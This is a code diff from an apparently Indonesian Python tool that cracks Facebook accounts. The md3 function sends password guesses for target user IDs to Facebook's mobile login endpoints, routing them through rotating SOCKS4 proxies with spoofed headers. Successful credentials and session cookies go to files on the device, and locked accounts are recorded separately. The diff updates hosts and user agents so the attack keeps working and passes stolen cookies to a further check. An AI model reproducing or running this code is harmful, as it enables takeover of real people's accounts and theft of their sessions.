@@ -351,24 +351,25 @@ def md2(idf,pwv):
 #---------------------[Method-3]---------------------#
 def md3(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Asdel-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
-  ua, ua2 = Ugen(),Ugen2()
+  sys.stdout.write(f'\r{P} [Asdel-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
+  sys.stdout.flush()
+  ua = random.choice(ugen)
   ses = requests.Session()
   for pw in pwv:
     try:
       nip=random.choice(proxsi)
       proxs= {'http': 'socks4://'+nip}
-      ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-      p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+      ses.headers.update({'Host': 'm.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'ar-MA,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6;q=0.8,en;q=0.7'})
+      p = ses.get('https://m.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.prod.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
-      heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
-      po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+      heade={'Host': 'm.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ar-MA,ar-EG;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6','connection': 'close'}
+      po = ses.post('https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [Fucking-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
+         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
@@ -377,15 +378,15 @@ def md3(idf,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{H} [Fucking-Ok] {idf}|{pw}{xxx}')
+        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
         if 'y' in cokix:
-         print(f'\r{P} Cookies {M}:{P} '+kuki)
-        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+         print(f'\r{B} Cookies {M}: {P}'+kuki)
+        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
         break
       else:
         continue
     except requests.exceptions.ConnectionError:
-      waktu(31)
+      time.sleep(33)
   loop+=1
 #---------------------[Apk]---------------------#
 def cek_apk(kuki):
